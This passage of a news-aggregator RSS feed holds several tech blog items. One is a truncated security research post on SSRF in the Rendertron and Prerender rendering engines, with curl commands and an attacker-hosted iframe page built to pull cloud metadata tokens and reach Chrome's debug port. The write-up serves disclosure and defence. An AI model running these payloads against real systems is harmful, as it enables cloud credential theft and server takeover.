id="block-yui_3_17_2_1_1605574654634_5617"><div>








  

    

      <figure data-scrolled="" data-test="image-block-v2-outer-wrapper">

        <div>
          
            <div data-animation-role="image" data-description="">
            
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/5e4dc27662292d3dc5548941/1605811014581-J2UDSS21SBNPHU7ZUEJH/ke17ZwdGBToddI8pDm48kNvT88LknE-K9M4pGNO0Iqd7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1USOFn4xF8vTWDNAUBm5ducQhX-V3oVjSmr829Rco4W2Uo49ZdOtO_QXox0_W7i2zEA/Subscribe-Video-Chat.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5e4dc27662292d3dc5548941/1605811014581-J2UDSS21SBNPHU7ZUEJH/ke17ZwdGBToddI8pDm48kNvT88LknE-K9M4pGNO0Iqd7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1USOFn4xF8vTWDNAUBm5ducQhX-V3oVjSmr829Rco4W2Uo49ZdOtO_QXox0_W7i2zEA/Subscribe-Video-Chat.jpg" data-image-dimensions="1920x1080" data-image-focal-point="0.5,0.5" alt="Subscribe-Video-Chat.jpg" src="https://fable-studio.com/behind-the-scenes/Subscribe-Video-Chat.jpg"></p>
          
            </div>
          

        </div>

        
          
          <figcaption data-width-ratio="">
            <div>

              

              
                <div><p>Lucy is an imaginative 8 year old who likes Mysteries, Science, and Drawing.</p></div>
              

              

            </div>
          </figcaption>
        

      </figure>

    

  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1605574654634_5907"><div><p>Once we provide the context, we also give it a line or two of dialogue to start the conversation. In the video above, we wrote the Guest saying, “Hi Lucy” and Lucy’s response, “Oh, a message. You must be a foozle!” The rest of the lines are then generated by GPT-3 -- with one exception: We wrote “I can’t sleep when there is a full moon, so I’m downstairs practicing for computer class tomorrow,” but all other lines were generated by GPT-3 based simply on the context and lines provided using a tool we will talk about in a follow up post.</p><p>Once the dialogue is selected, it’s sent through a TTS [Text-To-Speech] processor similar to the ones generating your turn-by-turn directions but much more advanced. We’ve trained a custom model on many samples of Lucy’s voice so that we can generate ad hoc lines for her, almost instantaneously. That audio is then fed into another model which converts her speech into lip sync and appropriate face animation. We added some tweaks to her head and eye movement, but most of this performance was completely automated without the need for custom animation.</p><p><br>This video is a demonstration of the powerful narratives that can emerge when you combine an artist’s vision, Artificial Intelligence, and emotional intelligence. Some of you may have more questions so feel free to reach out to us or <a href="https://fable-studio.com/signup"><span>sign up to experience a conversation with Lucy yourself</span></a>. While the GPT3 version of Lucy is not available to the public just yet, her current version is also very capable and available now for all those who sign up.</p></div></div></div></div></div></div>

        

        
        
          
        
      </div>

      
    </div>
  
</article>

</div>
    </div>
  </div>
</section>

  
</article>

          
          
          
        
      </div></div>]]>
            </description>
            <link>https://fable-studio.com/behind-the-scenes/ai-generation</link>
            <guid isPermaLink="false">hacker-news-small-sites-25153289</guid>
            <pubDate>Thu, 19 Nov 2020 19:21:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Exploiting dynamic rendering engines to take control of web apps]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25153225">thread link</a>) | @pabloest
<br/>
November 19, 2020 | https://r2c.dev/blog/2020/exploiting-dynamic-rendering-engines-to-take-control-of-web-apps/ | <a href="https://web.archive.org/web/*/https://r2c.dev/blog/2020/exploiting-dynamic-rendering-engines-to-take-control-of-web-apps/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><div><p>tl;dr:</p>
<ul>
<li>Dynamic rendering is a technique used to serve prerendered web site pages to crawlers (e.g., Google search engine, Slack or Twitter bots, etc.)</li>
<li>The most popular open source applications for dynamic rendering are Rendertron and Prerender; both of which may introduce vulnerabilities to a network if used improperly.</li>
<li>I used a vulnerability in Rendertron to take over a production web application and earn $5,000 through a bug bounty program.</li>
</ul>
<h2>Introduction</h2>
<p>Modern JavaScript frameworks are heavily utilized for web site development nowadays.
Instead of plain HTML pages, we now have PWAs (progressive web applications) and SPAs (single page applications) that do most of the work in the client's browser and use JavaScript to generate the contents of the page on the fly.</p>
<p>This technology has many advantages and can be effective at creating a sleek UI and UX, but at the same time, it is not <a href="https://en.wikipedia.org/wiki/Search_engine_optimization" target="_blank" rel="noopener">SEO</a> friendly, because crawlers and bots are not developed to render or understand JavaScript. One of the common ways to help bots get valid HTML content is to open a requested page in a headless browser instance on the server, such as <a href="https://pptr.dev/" target="_blank" rel="noopener">Puppeteer</a> or <a href="https://github.com/microsoft/playwright" target="_blank" rel="noopener">Playwright</a>, get the resulting HTML, strip parts that are not intended to be crawled and return it. This approach is called dynamic rendering and is promoted by <a href="https://developers.google.com/search/docs/guides/dynamic-rendering" target="_blank" rel="noopener">Google</a> as one of the possible ways to serve content.</p>

<p>I came across this type of application while doing a security review of packages in the Node.js ecosystem on possible vulnerabilities that may appear when utilizing headless browsers in production. I wrote Semgrep rules and ran them at scale to detect possible vulnerable uses of headless browsers. </p>
<blockquote>
<p>The rules are available in a Semgrep pack here: <a href="https://semgrep.dev/p/headless-browser" target="_blank" rel="noopener">https://semgrep.dev/p/headless-browser</a></p>
</blockquote>
<p>These Semgrep rules produced many results to triage and after investigating them I found out that a significant number of modules that use headless browsers are intended to help webmasters with dynamic rendering.</p>
<p>Due to the growing popularity of this concept, I believe it is important to investigate and understand what can go wrong while using dynamic rendering in production.</p>
<p>The scope of this research includes the two most popular open-source dynamic rendering applications, <a href="https://github.com/GoogleChrome/rendertron" target="_blank" rel="noopener">Rendertron</a> and <a href="https://github.com/prerender/prerender" target="_blank" rel="noopener">Prerender</a>, but the described attacks may be applied to other applications of this type as well. I'll also share how I was able to apply this knowledge to take over a production web server with a few curl requests and earn a $5,000 bug bounty.</p>
<h2>Architecture</h2>
<p>If a web page is generated dynamically on the client but needs to be properly indexed by search engines, a common approach is to catch a request from the crawler or bot, render it server-side, and output the pretty HTML with all the content. That flow generally looks like this:</p>
<p><span>
      <a href="https://r2c.dev/static/2961b2490dc7a3326f9434f550015ebf/077b7/dynamic-rendering-arch.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="dynamic rendering architecture" title="dynamic rendering architecture" src="https://r2c.dev/static/2961b2490dc7a3326f9434f550015ebf/077b7/dynamic-rendering-arch.png" srcset="https://r2c.dev/static/2961b2490dc7a3326f9434f550015ebf/5a46d/dynamic-rendering-arch.png 300w,
https://r2c.dev/static/2961b2490dc7a3326f9434f550015ebf/0a47e/dynamic-rendering-arch.png 600w,
https://r2c.dev/static/2961b2490dc7a3326f9434f550015ebf/077b7/dynamic-rendering-arch.png 1166w" sizes="(max-width: 1166px) 100vw, 1166px" loading="lazy">
  </a>
    </span></p>
<ol>
<li>The web server detects crawlers by checking the User-Agent header (or URL query in some cases).</li>
<li>Requests are routed to the rendering application.</li>
<li>The rendering application runs a headless browser and opens the original requested URL, which will render the page as if viewed by a user with a browser.</li>
<li>The resulting HTML is stripped of <code>&lt;script&gt;</code> tags and returned to the web server.</li>
<li>The web server returns the dynamically rendered page to the crawler.</li>
</ol>
<h2>How to identify a dynamic rendering application</h2>
<p>First of all, dynamic rendering is intended to be used with web pages that need to be indexed properly, so they are publicly available by definition. On top of that, prerendering makes sense only if most of the content on the page is generated by JavaScript (usually with a JS framework like React, Angular, Vue, etc.) and created dynamically at the same time. Some examples include: the main page of a news website that updates in real-time or an online store page with a list of the most popular products.</p>
<p>When a candidate site is found, you can identify if dynamic rendering is possible by sending multiple requests to the same page but with different User-Agent headers (remember, dynamic rendering tries to render pages for crawlers):</p>
<div data-language="bash"><pre><code>
<span>curl</span> -v -A <span>"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36"</span> https://shop.polymer-project.org/</code></pre></div>
<div data-language="bash"><pre><code>
<span>curl</span> -v -A <span>"Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)"</span> https://shop.polymer-project.org/</code></pre></div>
<p>If the curl results are different and the response for the fake crawler request has pretty HTML without any <code>&lt;script&gt;</code> tags, it means that the website is using dynamic rendering.</p>
<p>You can test this with <a href="https://shop.polymer-project.org/" target="_blank" rel="noopener">https://shop.polymer-project.org/</a> as an example — it is a demo site for demonstrating dynamic rendering.</p>
<p><span>
      <a href="https://r2c.dev/static/37e85859c307b4cdec09b478c3ed9636/d5682/dynamic-rendering-curl.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="compare two requests with curl" title="compare two requests with curl" src="https://r2c.dev/static/37e85859c307b4cdec09b478c3ed9636/c1b63/dynamic-rendering-curl.png" srcset="https://r2c.dev/static/37e85859c307b4cdec09b478c3ed9636/5a46d/dynamic-rendering-curl.png 300w,
https://r2c.dev/static/37e85859c307b4cdec09b478c3ed9636/0a47e/dynamic-rendering-curl.png 600w,
https://r2c.dev/static/37e85859c307b4cdec09b478c3ed9636/c1b63/dynamic-rendering-curl.png 1200w,
https://r2c.dev/static/37e85859c307b4cdec09b478c3ed9636/d61c2/dynamic-rendering-curl.png 1800w,
https://r2c.dev/static/37e85859c307b4cdec09b478c3ed9636/d5682/dynamic-rendering-curl.png 2379w" sizes="(max-width: 1200px) 100vw, 1200px" loading="lazy">
  </a>
    </span></p>
<p>If you want to see how each app responds to various User-Agent headers, you can check out the code itself:</p>
<p><a href="https://github.com/prerender/prerender-node/blob/f9c5e12b0e271ded3e3cb6c70b703485280ec9d6/index.js#L37" target="_blank" rel="noopener">https://github.com/prerender/prerender-node/blob/f9c5e12b0e271ded3e3cb6c70b703485280ec9d6/index.js#L37</a></p>
<p><a href="https://github.com/GoogleChrome/rendertron/blob/a1dd3ab1f054bc19e89dcdecdb71dc004f7d068e/middleware/src/middleware.ts#L24" target="_blank" rel="noopener">https://github.com/GoogleChrome/rendertron/blob/a1dd3ab1f054bc19e89dcdecdb71dc004f7d068e/middleware/src/middleware.ts#L24</a></p>
<p>In addition, Rendertron will return the following header: <code>X-Renderer: Rendertron</code>. Prerender has an option for adding an <code>X-Prerender: 1</code> header, but it is not default behavior.</p>
<p>Lastly, both Rendertron and Prerenderer parse specific meta tags in order to change response headers or HTTP status codes. In other words, it gives developers the opportunity to manipulate rendering results by leaving meta tags in the source code of the page. These can also be used to identify a dynamic rendering application.</p>
<p>For Prerender they look like this:</p>
<div data-language="php"><pre><code><span>&lt;</span>meta name<span>=</span><span>"prerender-status-code"</span> content<span>=</span><span>"302"</span> <span>/</span><span>&gt;</span>
<span>&lt;</span>meta name<span>=</span><span>"prerender-header"</span> content<span>=</span><span>"Location: https://www.google.com"</span> <span>/</span><span>&gt;</span></code></pre></div>
<p>For Rendertron:</p>
<div data-language="php"><pre><code><span>&lt;</span>meta name<span>=</span><span>"render:status_code"</span> content<span>=</span><span>"404"</span> <span>/</span><span>&gt;</span></code></pre></div>
<h2>Easy SSRF</h2>
<p>It’s easy to take advantage of a dynamic rendering app when it is publicly available because it allows you to interact with the app directly and send arbitrary requests, including to local endpoints. There are some restrictions for accessing local infrastructure, but depending on the version of the dynamic rendering app, they can be bypassed.</p>
<h3>Rendertron</h3>
<p>Rendertron is quite easy to identify because it has a web frontend that allows you to send requests and take screenshots of the requested page.</p>
<p><span>
      <a href="https://r2c.dev/static/eaae36db20f54f61637810aeea43748d/4971b/dynamic-rendering-rendertron.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Rendertron" title="Rendertron" src="https://r2c.dev/static/eaae36db20f54f61637810aeea43748d/4971b/dynamic-rendering-rendertron.png" srcset="https://r2c.dev/static/eaae36db20f54f61637810aeea43748d/5a46d/dynamic-rendering-rendertron.png 300w,
https://r2c.dev/static/eaae36db20f54f61637810aeea43748d/0a47e/dynamic-rendering-rendertron.png 600w,
https://r2c.dev/static/eaae36db20f54f61637810aeea43748d/4971b/dynamic-rendering-rendertron.png 784w" sizes="(max-width: 784px) 100vw, 784px" loading="lazy">
  </a>
    </span></p>
<ul>
<li>Version 3.1.0 has allow-listing option to restrict rendering to a given list of domains or URL patterns (but it needs to be configured:))</li>
<li>Version 3.0.0 blocks any requests to Google Cloud—however, this can bypassed by requesting metadata endpoints inside an iFrame. This restriction does not apply to other cloud providers (AWS, DigitalOcean, etc.) and are still a danger!</li>
<li>Older versions block requests to Google Cloud but allow requests to its beta version <code>http://metadata.google.internal/computeMetadata/v1beta1/</code> (deprecated since September 30)</li>
<li>Version 1.1.1 and older allow all kinds of requests</li>
</ul>
<p>Rendertron’s API (from the docs):</p>
<p><strong>GET /render/:url</strong><br>
The render endpoint will render and serialize your page.</p>
<p><strong>GET /screenshot/:url</strong><br>
<strong>POST /screenshot/:url</strong><br>
The screenshot endpoint takes a screenshot of your page (as an image).</p>
<p>Additional options are available as a JSON string in the POST body. See <a href="https://github.com/GoogleChrome/puppeteer/blob/v1.6.0/docs/api.md#pagescreenshotoptions" target="_blank" rel="noopener">Puppeteer documentation</a> for available options. You cannot specify the type (defaults to jpeg) and encoding (defaults to binary) parameters.</p>
<p>So, when you stumble upon a Rendertron instance, it is worth trying to perform a SSRF attack and exfiltrate cloud tokens like this:</p>
<div data-language="bash"><pre><code><span>curl</span> https://rendertron-instance.here/render/http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token</code></pre></div>
<p>or,</p>
<div data-language="bash"><pre><code><span>curl</span> https://rendertron-instance.here/render/http://169.254.169.254/latest/meta-data/</code></pre></div>
<p>(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery" target="_blank" rel="noopener">This is a great resource</a> for SSRF payloads.)</p>
<p>If requests are blocked, there is still a chance to force the headless browser to fetch an iFrame and output a screenshot of the metadata endpoint by sending requests to /screenshot and forcing the server to visit a website you control:</p>
<!-- markdown-link-check-disable -->
<div data-language="bash"><pre><code><span>curl</span> https://rendertron-instance.here/render/http://www.attackers-website.here/iframe-example</code></pre></div>
<!-- markdown-link-check-enable -->
<p>The HTML at www.attackers-website.here includes an iFrame with the metadata endpoint. This forces Rendertron to fetch the attacker HTML and render the page on its own server. This means that the iFrame will also be resolved on its own server.</p>
<div data-language="php"><pre><code><span>&lt;</span>html<span>&gt;</span>
  <span>&lt;</span>head<span>&gt;</span>
    <span>&lt;</span>meta content<span>=</span><span>"text/html; charset=utf-8"</span> http<span>-</span>equiv<span>=</span><span>"Content-Type"</span> <span>/</span><span>&gt;</span>
  <span>&lt;</span><span>/</span>head<span>&gt;</span>
  <span>&lt;</span>body<span>&gt;</span>
    <span>&lt;</span>iframe
      src<span>=</span><span>"http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json"</span>
      width<span>=</span><span>"468"</span>
      height<span>=</span><span>"600"</span>
    <span>&gt;</span><span>&lt;</span><span>/</span>iframe<span>&gt;</span>
  <span>&lt;</span><span>/</span>body<span>&gt;</span>
<span>&lt;</span><span>/</span>html<span>&gt;</span></code></pre></div>
<p>This outputs a screenshot of the iFrame containing the cloud instance metadata.
<span>
      <a href="https://r2c.dev/static/0e9c2b61133020bcb36284326fe1ff4d/a4d88/dynamic-rendering-iframe.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Rendertron iFrame hack" title="Rendertron iFrame hack" src="https://r2c.dev/static/0e9c2b61133020bcb36284326fe1ff4d/a4d88/dynamic-rendering-iframe.png" srcset="https://r2c.dev/static/0e9c2b61133020bcb36284326fe1ff4d/5a46d/dynamic-rendering-iframe.png 300w,
https://r2c.dev/static/0e9c2b61133020bcb36284326fe1ff4d/a4d88/dynamic-rendering-iframe.png 495w" sizes="(max-width: 495px) 100vw, 495px" loading="lazy">
  </a>
    </span></p>
<blockquote>
<p>Patched in <a href="https://github.com/GoogleChrome/rendertron/releases/tag/3.1.0" target="_blank" rel="noopener">3.1.0</a> version</p>
</blockquote>
<h3>Prerender</h3>
<p>Prerender does not have a GUI frontend and is not as easy to identify. Worse, requests to / return 400 without any interesting headers:</p>
<div data-language="http"><pre><code><span>HTTP/1.1 <span>400 Bad Request</span></span>
 text/html;charset=UTF-8
 Accept-Encoding
 Mon, 03 Aug 2020 06:55:29 GMT</code></pre></div>
<p>Prerender API</p>
<p><strong>GET /:url</strong><br>
<strong>GET /render?url=:url</strong><br>
<strong>POST /render?url=:url</strong></p>
<p>list of options can be found in the <a href="https://github.com/prerender/prerender#url" target="_blank" rel="noopener">docs</a>, main takeaways:</p>
<ul>
<li>Prerender is also able to a create screenshots</li>
<li><code>followRedirects</code> (false by default) follow 301 redirects if true</li>
</ul>
<p>The only way to identify if an application is using Prerender is to send a request like <code>/render?url=http://www.example.com</code> and check the output. Prerender does not have any built-in protection from cloud data exfiltration but does allow users to configure blacklists and whitelists, so depending on its configuration, chances are that it may be possible to request cloud tokens like</p>
<div data-language="bash"><pre><code><span>curl</span> https://rendertron-instance.here/render?url<span>=</span>http://169.254.169.254/latest/meta-data/</code></pre></div>
<p>On top of that, Prerender connects to headless Chrome through the debug interface, which opens on the hardcoded port 9222.</p>
<p>So if local requests are allowed, it’s possible to figure out the Chrome debug ID</p>
<div data-language="bash"><pre><code><span>curl</span> https://rendertron-instance.here/render?url<span>=</span>http://localhost:9222/json/</code></pre></div>
<p>And then send WebSocket requests to the headless Chrome directly and …</p></div></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://r2c.dev/blog/2020/exploiting-dynamic-rendering-engines-to-take-control-of-web-apps/">https://r2c.dev/blog/2020/exploiting-dynamic-rendering-engines-to-take-control-of-web-apps/</a></em></p>]]>
            </description>
            <link>https://r2c.dev/blog/2020/exploiting-dynamic-rendering-engines-to-take-control-of-web-apps/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25153225</guid>
            <pubDate>Thu, 19 Nov 2020 19:17:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Product category: version controlled databases]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25152907">thread link</a>) | @oscar-batori
<br/>
November 19, 2020 | https://www.dolthub.com/blog/2020-11-17-version-control-databases-defining-a-category/ | <a href="https://web.archive.org/web/*/https://www.dolthub.com/blog/2020-11-17-version-control-databases-defining-a-category/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-cy="blog-post-text"><p>"Database version control" and "version controlled database" are not the same thing. Version controlling your database refers to the practice of storing schema and schema modifications in a traditional source control system like Git. "Version controlled database" represents a class of append-only databases that offer traditional version control features like branch, diff, and merge across both schema and data. A Google search for <a href="https://www.google.com/search?ei=bXm0X5DDBtWd-gT_krCwCA&amp;q=version+controlled+database&amp;oq=version+controlled+database&amp;gs_lcp=CgZwc3ktYWIQAzICCAAyBAgAEB4yBggAEAoQHjoECAAQRzoECAAQDToICAAQBxAKEB46BggAEAcQHjoGCAAQDRAeULbMAVjO0AFgl9IBaABwA3gAgAGcAYgBzQKSAQMyLjGYAQCgAQGqAQdnd3Mtd2l6yAEIwAEB&amp;sclient=psy-ab&amp;ved=0ahUKEwjQrcSO-YrtAhXVjp4KHX8JDIYQ4dUDCA0&amp;uact=5">"version controlled database"</a> doesn't contain a single database product, but instead products and best practices for managing the schema of existing database solutions:
<span>
      <span></span>
  <img alt="Search Results for &quot;version controlled databases&quot;" title="Search Results for &quot;version controlled databases&quot;" src="https://www.dolthub.com/blog/static/e817fbd3f0a6fdd8b293d2b2017c5cc9/ad12c/version_controlled_database_google_search.png" srcset="https://www.dolthub.com/blog/static/e817fbd3f0a6fdd8b293d2b2017c5cc9/a48b3/version_controlled_database_google_search.png 214w,
https://www.dolthub.com/blog/static/e817fbd3f0a6fdd8b293d2b2017c5cc9/47730/version_controlled_database_google_search.png 428w,
https://www.dolthub.com/blog/static/e817fbd3f0a6fdd8b293d2b2017c5cc9/ad12c/version_controlled_database_google_search.png 856w,
https://www.dolthub.com/blog/static/e817fbd3f0a6fdd8b293d2b2017c5cc9/7a18f/version_controlled_database_google_search.png 1284w,
https://www.dolthub.com/blog/static/e817fbd3f0a6fdd8b293d2b2017c5cc9/56caf/version_controlled_database_google_search.png 1712w,
https://www.dolthub.com/blog/static/e817fbd3f0a6fdd8b293d2b2017c5cc9/76435/version_controlled_database_google_search.png 1742w" sizes="(max-width: 856px) 100vw, 856px" loading="lazy">
    </span></p>
<p>Using version control to manage your database schema is a very good thing, but it is not a "version controlled database." The goal of this post is to reclaim the term "version control database" for products that actually are databases with version control features. We are not unbiased here. We built <a href="https://doltdb.com/">Dolt</a>, a SQL database with Git-style version control features. We think it will be the category defining product, and we want people to be able to find it.</p>
<h2>Version Controlled Database vs Database Version Control</h2>
<p>To make our case for reclaiming this term, it's worth being precise about the distinction we are trying to draw:
<span>
      <a href="https://www.dolthub.com/blog/static/42f24c60af9f9ce77788bfd9687bb02f/6acbf/version_controlled_database_concept.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Distinct Concepts" title="Distinct Concepts" src="https://www.dolthub.com/blog/static/42f24c60af9f9ce77788bfd9687bb02f/ad12c/version_controlled_database_concept.png" srcset="https://www.dolthub.com/blog/static/42f24c60af9f9ce77788bfd9687bb02f/a48b3/version_controlled_database_concept.png 214w,
https://www.dolthub.com/blog/static/42f24c60af9f9ce77788bfd9687bb02f/47730/version_controlled_database_concept.png 428w,
https://www.dolthub.com/blog/static/42f24c60af9f9ce77788bfd9687bb02f/ad12c/version_controlled_database_concept.png 856w,
https://www.dolthub.com/blog/static/42f24c60af9f9ce77788bfd9687bb02f/6acbf/version_controlled_database_concept.png 1001w" sizes="(max-width: 856px) 100vw, 856px" loading="lazy">
  </a>
    </span></p>
<p>The diagram highlights the nature of the difference between a set of best practices and tools, and a database product:</p>
<ul>
<li>"Database version control" involves using a version control system (VCS) such as Git to version the schema and schema modifications of your database. The database itself knows nothing of its version history. There are many advanced tools and products for this.</li>
<li>A "version controlled database" is a database that stores a full history of its own state, both data and schema.</li>
</ul>
<p>This distinction brings us to the features that define "version controlled databases" as a category: the ability to store a history of its state, along with some version of branching, merging, and diffing across the stored history.</p>
<h2>Why now?</h2>
<p>In a blog entitled <a href="https://medium.com/@karpathy/software-2-0-a64152b37c35">Software 2.0</a>, Andrej Karpathy, a machine learning and artificial intelligence researcher and practitioner, describes a world where computer behavior is increasingly determined by data rather than code. You don't have to be an AI or ML cheerleader to recognize the increasing importance of data in determining the behavior of production systems. Ultimately, the value of data is increasing. Separately, storage costs of data have been in long run secular decline. These two factors combined with the advent of <a href="https://en.wikipedia.org/wiki/Merkle_tree">Merkle tree</a> make it tractable to expose a full data history to a query interface, and therefore to build true version controlled databases.</p>
<h2>Why adopt</h2>
<p>We identified the fundamental features of a version controlled database as both the ability to store a history of the database state, as well as version control primitives such as branching, merging, and diffing.</p>
<h3>Branching and Merging</h3>
<p>Branching and merging are fundamental primitives for collaboration. They allow users to work concurrently against the same base dataset, and then resolve their differences in a principled and robust way. These capabilities differentiate version control databases from existing solutions by enabling users to collaborate on datasets without application layer code. The existing paradigm for databases imagines a single concept of state, and any tools that permit versioning and reconciliation need to be built into the application layer.</p>
<h3>Diffing</h3>
<p>Robust computation of "diffs" is not just useful for review, it is what enables version control systems to effectively implement operations like <code>clone</code> and <code>pull</code>. By implementing efficient diffs across their history, version control databases make for excellent data distribution formats. Users can <code>clone</code> and <code>pull</code> datasets, instantly querying strongly typed data using the database's query interface. The concept of "loading" data becomes redundant, and a whole class of errors defined by data type corruption is eliminated. It shouldn't be necessary to figure out what strings a data vendor uses to signify <code>NULL</code>, it should be native to the distribution format.</p>
<p>These features combine to provide much needed capabilities to data science and data engineering teams, and whoever else might have use for them. In particular</p>
<ul>
<li>collaboration becomes a first class consideration, with the ability for potentially hundreds of users to edit a dataset concurrently and robustly combine the results</li>
<li>experiments and their results become completely reproducible by associating runs with a commit hash of the input data and result set</li>
<li>distribution is transformed from a headache of parsing and loading various data formats which do not provide type guarantees to simply executing <code>clone</code> and <code>pull</code> operations</li>
</ul>
<p>In summary, we believe that version control databases can enable teams with powerful capabilities that they would otherwise have to invest considerable engineering resources in building and maintaining on top of existing database solutions.</p>
<h2>Examples of Version Controlled Databases</h2>
<p>If you've gotten to this point, it's likely that you are at least curious about what the landscape of products in this category of databases looks like. Naturally there are options other than Dolt, and for some use-cases those options might be the best fit.</p>
<h3>TerminusDB</h3>
<p><a href="https://github.com/terminusdb">TerminusDB</a> is a graph database, which means that data is described and queried in terms of graph data structures. It implements its own query language. TerminusDB is inspired by Git, and supports branching, merging and diffing in a Git-like interface.</p>
<h3>Noms</h3>
<p>Dolt is built on top of <a href="https://github.com/attic-labs/noms">Noms</a>. Noms is a Git-like distributed database that provides storage for structured objects defined by Go structs. Noms provides versioning and synchronization primitives for both the object definitions themselves, and values those objects take on. Users interact with Noms via Go code.</p>
<h3>Irmin</h3>
<p><a href="https://github.com/mirage/irmin">Irmin</a> is a storage layer agnostic database inspired by Git, and written in O'Caml. Users define objects in O'Caml that can then be stored using Git-like semantics. It is quite similar in spirit to Noms, but instead of Go structs, users describe, create, and update their data in O'Caml code.</p>
<h3>Dolt</h3>
<p><a href="https://github.com/dolthub/dolt">Dolt</a> is our entry into this novel category of database. Dolt is a SQL database that implements the MySQL standard. Dolt leans heavily on Git, and implements branching, merging, and diff operations, and other Git primitives where relevant.</p>
<h2>Why Dolt</h2>
<p>The choice to implement the MySQL standard as a query interface strongly differentiates Dolt. Other version controlled databases, while interesting, require users to adopt a query interface that suits the database. Dolt takes the opposite position. We believe that SQL is the language of choice for the vast majority of our potential users, and we made the decision to adopt a query interface that suits our users.</p>
<p>As consequence of choosing the MySQL standard is compatibility with a huge ecosystem of tools that connect to Dolt out of the box. A quick look at our <a href="https://www.dolthub.com/docs/integrations/programmatic-clients/">docs</a> shows nine programming languages with tested MySQL connectors that work with Dolt. For folks that know SQL, and one of those nine programming languages, getting started with Dolt should be straight forward.</p>
<p>This design decision does not come without costs. The underlying commit graph storage is not a natural fit for a SQL query engine, and implementing a super set of MySQL on top of that storage layer is a huge technical commitment. Not only are we committed to matching everything MySQL can do, but we also have to design a set of functions to expose the commit graph in our SQL engine.</p>
<h2>Conclusion</h2>
<p>The software industry has long considered version control something that is <em>done to</em> databases, not a <em>feature of</em> databases. At DoltHub we consider "version controlled database" to be a product category, and Dolt is our attempt at a product that fits in that category.</p>
<p>Version control databases are not competitive with the <em>practice</em> of version controlling your database schema, or products that implement that practice. Instead they are a relatively novel category of databases differentiated by features that cater to users who care about capabilities that support collaboration, versioning, reproducibility, and distribution. By making these capabilities native to Dolt we hope to enable users to elevate the quality of their data infrastructure without the need to write and maintain application code, as well as open up possibilities that simply did not exist before.</p>
<p>If you want to talk to us about how you might use <a href="https://doltdb.com/">Dolt</a>, or DoltHub, feel free to <a href="https://www.dolthub.com/contact">get in touch</a> via email, or join us on <a href="https://discord.com/invite/RFwfYpu">Discord</a>.</p></div></div>]]>
            </description>
            <link>https://www.dolthub.com/blog/2020-11-17-version-control-databases-defining-a-category/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25152907</guid>
            <pubDate>Thu, 19 Nov 2020 18:49:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Is Adaptive Bitrate Streaming? Why Does It Matter?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25152080">thread link</a>) | @kerrarbone
<br/>
November 19, 2020 | https://antmedia.io/adaptive-bitrate-streaming/ | <a href="https://web.archive.org/web/*/https://antmedia.io/adaptive-bitrate-streaming/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="panel-34820-1-1-1" data-index="5"><div>
<div> <p><span>Adaptive streaming allows the video provider to create a different video for each of the screen sizes, devices or </span><span>connection speed</span><span> that he or she wishes to target.&nbsp;</span></p> <p><span>When there are multi-bitrates on the server-side, Ant Media Server measures the viewers' internet speed and sends the best quality according to the internet speed of the viewer.&nbsp; For instance,</span></p> <p><strong>Assume that there are two bitrates on the server</strong></p> <p>-The first one is 360p and 800kbps</p> <p>-The second one is 480p and 1500kbps.</p> <p><strong>if Viewer internet speed</strong></p> <p>-is above 1500kbps, then the resolution with 480p is sent.</p> <p>-is between 800kbps and 1500kbps or less than 800kbps, then the resolution with 360p is sent.</p></div></div></div></div>]]>
            </description>
            <link>https://antmedia.io/adaptive-bitrate-streaming/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25152080</guid>
            <pubDate>Thu, 19 Nov 2020 17:45:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dashboard for Nyxt]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25151976">thread link</a>) | @jmercouris
<br/>
November 19, 2020 | https://nyxt.atlas.engineer/article/dashboard.org | <a href="https://web.archive.org/web/*/https://nyxt.atlas.engineer/article/dashboard.org">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


  <meta charset="utf-8">
  <meta name="generator" content="pandoc">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <meta name="author" content="By John Mercouris">
  <title>Nyxt Dashboard</title>
  
  
  <!--[if lt IE 9]>
    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
  <![endif]-->


<header>


</header>
<p>We are excited to introduce the new built-in Nyxt dashboard! (this feature will be available in the next release of Nyxt).</p>
